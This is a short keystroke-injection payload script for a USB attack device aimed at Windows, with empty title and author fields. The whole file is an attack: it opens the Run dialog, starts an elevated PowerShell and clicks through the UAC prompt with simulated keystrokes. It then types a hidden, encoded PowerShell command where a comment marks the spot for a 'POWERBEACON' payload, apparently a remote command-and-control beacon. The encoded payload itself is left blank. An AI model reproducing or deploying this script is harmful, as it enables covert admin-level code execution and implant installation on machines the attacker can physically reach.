# Title: 
# Author: 
# Version: 1.0
# Target: Windows
#
# 
# Green .........Power On
# White .........Started
# White Blinking......... Running
# Purple.................Finished
################################################

ATTACKMODE HID 
LED W
LED W 200

# Open windows run console

Q GUI r
Q DELAY 2000

# start an admin powershell
Q STRING powershell.exe start powershell -verb runas
Q ENTER
Q DELAY 3000
Q LEFTARROW
Q ENTER
Q DELAY 3000

#POWERBEACON PAYLOAD GOES HERE
Q STRING powershell -nop -w hidden -e 
Q ENTER
LED M
